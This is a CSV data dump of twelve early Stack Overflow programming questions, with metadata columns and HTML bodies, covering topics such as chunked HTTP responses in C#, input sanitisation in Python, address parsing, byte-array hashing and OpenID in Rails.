Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"16998","1","17236","","2008-08-19 21:28:53","","12","17497","<p>I'm having trouble reading a ""chunked"" response when using a StreamReader to read the stream returned by GetResponseStream() of a HttpWebResponse:</p>

<pre><code>// response is an HttpWebResponse
StreamReader reader = new StreamReader(response.GetResponseStream());
string output = reader.ReadToEnd(); // throws exception...
</code></pre>

<p>When the <code>reader.ReadToEnd()</code> method is called I'm getting the following System.IO.IOException: <strong>Unable to read data from the transport connection: The connection was closed.</strong></p>

<p>The above code works just fine when server returns a ""non-chunked"" response.</p>

<p>The only way I've been able to get it to work is to use HTTP/1.0 for the initial request (instead of HTTP/1.1, the default) but this seems like a lame work-around.</p>

<p>Any ideas?</p>

<hr>

<p>@Chuck</p>

<p>Your solution works pretty good. It still throws the same IOExeception on the last Read(). But after inspecting the contents of the StringBuilder it looks like all the data has been received. So perhaps I just need to wrap the Read() in a try-catch and swallow the ""error"".</p>
","2047","Craig","50776","Stu Thompson","2012-05-24 17:27:24","2019-07-22 16:11:29","Reading ""chunked"" response with HttpWebResponse","<c#><http><.net-3.5><.net-2.0>","5","2","3","",""
"16861","1","","","2008-08-19 20:18:31","","57","30788","<p>What is the best way to sanitize user input for a Python-based web application? Is there a single function to remove HTML characters and any other necessary characters combinations to prevent an <a href=""http://en.wikipedia.org/wiki/Cross-site_scripting"" rel=""noreferrer"">XSS</a> or SQL injection attack?</p>
","2019","Steve","7750640","","2017-07-11 01:42:17","2017-07-11 01:42:17","Sanitising user input using Python","<python><xss>","7","3","30","",""
"16529","1","16549","","2008-08-19 16:49:30","","2","1212","<p>I've been developing a ""Form Builder"" in Javascript, and coming up to the part where I'll be sending the spec for the form back to the server to be stored. The builder maintains an internal data structure that represents the fields, label, options (for select/checkbox/radio), mandatory status, and the general sorting order of the fields.</p>

<p>When I want to send this structure back to the server, which format should I communicate it with?</p>

<p>Also, when restoring a server-saved form back into my Javascript builder, should I load in the data in the same format it sent it with, or should I rebuild the fields using the builder's <code>createField()</code> functions?</p>
","1951","mercutio","5284246","Chris Fournier","2015-10-14 12:53:30","2015-10-14 12:53:30","Communication between Javascript and the server","<javascript><server>","5","0","","",""
"16413","1","16444","","2008-08-19 15:34:41","","128","137441","<p>Problem: I have an address field from an Access database which has been converted to Sql Server 2005. This field has everything all in one field. I need to parse out the individual sections of the address into their appropriate fields in a normalized table. I need to do this for approximately 4,000 records and it needs to be repeatable.</p>

<p>Assumptions:</p>

<ol>
<li><p>Assume an address in the US (for now)</p></li>
<li><p>assume that the input string will sometimes contain an addressee (the person being addressed) and/or a second street address (i.e. Suite B)</p></li>
<li><p>states may be abbreviated</p></li>
<li><p>zip code could be standard 5 digit or zip+4</p></li>
<li><p>there are typos in some instances</p></li>
</ol>

<p>UPDATE: In response to the questions posed, standards were not universally followed, I need need to store the individual values, not just geocode and errors means typo (corrected above)</p>

<p>Sample Data:</p>

<ul>
<li><p>A. P. Croll &amp; Son  2299 Lewes-Georgetown Hwy, Georgetown, DE 19947</p></li>
<li><p>11522 Shawnee Road, Greenwood DE  19950</p></li>
<li><p>144 Kings Highway, S.W. Dover, DE  19901</p></li>
<li><p>Intergrated Const. Services 2 Penns Way Suite 405 New Castle, DE  19720</p></li>
<li><p>Humes Realty 33 Bridle Ridge Court, Lewes, DE  19958</p></li>
<li><p>Nichols Excavation 2742 Pulaski Hwy Newark, DE  19711</p></li>
<li><p>2284 Bryn Zion Road, Smyrna, DE  19904</p></li>
<li><p>VEI Dover Crossroads, LLC  1500 Serpentine Road, Suite 100 Baltimore MD  21</p></li>
<li><p>580 North Dupont Highway Dover, DE  19901</p></li>
<li><p>P.O. Box 778 Dover, DE  19903</p></li>
</ul>
","149","Rob Allen","2641576","Remou","2014-11-25 20:42:56","2015-06-12 21:55:00","Parse usable Street Address, City, State, Zip from a string","<string><parsing><sql-server-2005><street-address>","24","5","96","2014-12-13 11:37:37",""
"16340","1","","","2008-08-19 14:55:33","","47","37493","<p>Say I have an object that stores a byte array and I want to be able to efficiently generate a hashcode for it. I've used the cryptographic hash functions for this in the past because they are easy to implement, but they are doing a lot more work than they should to be cryptographically oneway, and I don't care about that (I'm just using the hashcode as a key into a hashtable).</p>

<p>Here's what I have today:</p>

<pre><code>struct SomeData : IEquatable&lt;SomeData&gt;
{
    private readonly byte[] data;
    public SomeData(byte[] data)
    {
        if (null == data || data.Length &lt;= 0)
        {
            throw new ArgumentException(""data"");
        }
        this.data = new byte[data.Length];
        Array.Copy(data, this.data, data.Length);
    }

    public override bool Equals(object obj)
    {
        return obj is SomeData &amp;&amp; Equals((SomeData)obj);
    }

    public bool Equals(SomeData other)
    {
        if (other.data.Length != data.Length)
        {
            return false;
        }
        for (int i = 0; i &lt; data.Length; ++i)
        {
            if (data[i] != other.data[i])
            {
                return false;
            }
        }
        return true;
    }
    public override int GetHashCode()
    {
        return BitConverter.ToInt32(new MD5CryptoServiceProvider().ComputeHash(data), 0);
    }
}
</code></pre>

<p>Any thoughts?</p>

<hr>

<p>dp: You are right that I missed a check in Equals, I have updated it.  Using the existing hashcode from the byte array will result in reference equality (or at least that same concept translated to hashcodes).
for example:</p>

<pre><code>byte[] b1 = new byte[] { 1 };
byte[] b2 = new byte[] { 1 };
int h1 = b1.GetHashCode();
int h2 = b2.GetHashCode();
</code></pre>

<p>With that code, despite the two byte arrays having the same values within them, they are referring to different parts of memory and will result in (probably) different hash codes. I need the hash codes for two byte arrays with the same contents to be equal.</p>
","1948","Andrew","63550","Andrew","2015-06-26 01:24:48","2019-05-07 17:41:22","How do I generate a hashcode from a byte array in C#?","<c#><hash>","11","0","18","",""
"16100","1","16104","","2008-08-19 12:51:55","","766","590973","<p>What's the best way to convert a string to an enumeration value in C#?</p>

<p>I have an HTML select tag containing the values of an enumeration. When the page is posted, I want to pick up the value (which will be in the form of a string) and convert it to the enumeration value.</p>

<p>In an ideal world, I could do something like this:</p>

<pre><code>StatusEnum MyStatus = StatusEnum.Parse(""Active"");
</code></pre>

<p>but that isn't a valid code.</p>
","203","Ben Mills","1297556","Keith","2019-03-07 08:29:18","2019-07-26 01:19:27","Convert a string to an enum in C#","<c#><string><enums>","22","0","144","",""
"16007","1","16039","","2008-08-19 11:24:55","","46","95218","<p>Basically I have some code to check a specific directory to see if an image is there and if so I want to assign a URL to the image to an ImageControl.</p>

<pre><code>if (System.IO.Directory.Exists(photosLocation))
{
    string[] files = System.IO.Directory.GetFiles(photosLocation, ""*.jpg"");
    if (files.Length &gt; 0)
    {
        // TODO: return the url of the first file found;
    }
}
</code></pre>
","1762","Andy Rose","249341","","2015-03-06 04:32:53","2018-01-12 23:36:23","How do I convert a file path to a URL in ASP.NET","<asp.net><url><image>","10","0","5","",""
"15732","1","16054","","2008-08-19 04:59:04","","253","261669","<p>I'm generating some xml files that needs to conform to an xsd file that was given to me.  What's the best way to verify they conform?</p>
","1650","Jeff","6887084","Eddie","2016-12-27 10:12:12","2019-02-06 18:19:15","What's the best way to validate an XML file against an XSD file?","<java><xml><validation><xsd>","12","0","120","",""
"14617","1","15937","","2008-08-18 13:43:48","","222","352783","<p>I'm trying to retrieve a file from a server using SFTP (as opposed to FTPS) using Java. How can I do this?</p>
","1769","","2756409","","2017-01-10 16:24:18","2017-10-04 07:59:19","How to retrieve a file from a server via SFTP?","<java><ftp><sftp><security>","16","0","114","",""
"13620","1","13665","","2008-08-17 13:19:32","","46","19175","<p>(assume php5) consider</p>

<pre><code>&lt;?php

    $foo = 'some words';

    //case 1
    print ""these are $foo"";

    //case 2
    print ""these are {$foo}"";

    //case 3
    print 'these are ' . $foo;
?&gt;
</code></pre>

<p>Is there much of a difference between 1 and 2?</p>

<p>If not, what about between 1/2 and 3?</p>
","314","Uberfuzzy","4311889","","2016-04-29 14:45:39","2017-04-26 04:56:08","Speed difference in using inline strings vs concatenation in php5?","<php><optimization><performance>","12","5","31","",""
"13615","1","4807469","","2008-08-17 13:14:42","","65","41676","<p>I need to validate an integer to know if is a valid enum value.</p>

<p>What is the best way to do this in C#?</p>
","1154","Jedi Master Spooky","588306","Jedi Master Spooky","2013-12-06 13:09:22","2019-08-20 17:33:44","Validate Enum Values","<c#><validation><enums>","10","3","4","",""
"13254","1","13268","","2008-08-16 17:54:58","","23","6999","<p>I am a neophyte with Ruby on Rails but I've created a couple of small apps. Anyway, I'm really interested in OpenID and I would like to implement OpenID authentication and maybe some Sreg stuff in a Rails app. All of the research that I have done has come up with articles that are out of date or just don't work for me. Since I'm so new to Rails I'm having difficulty debugging the issues so...</p>

<p>What is the best way to implement OpenId in Rails?</p>
","1353","martinatime","206401","Gaius","2013-01-14 04:58:06","2013-10-02 19:36:35","OpenID authentication in Ruby on Rails","<ruby-on-rails><ruby><authentication><openid>","5","0","8","",""
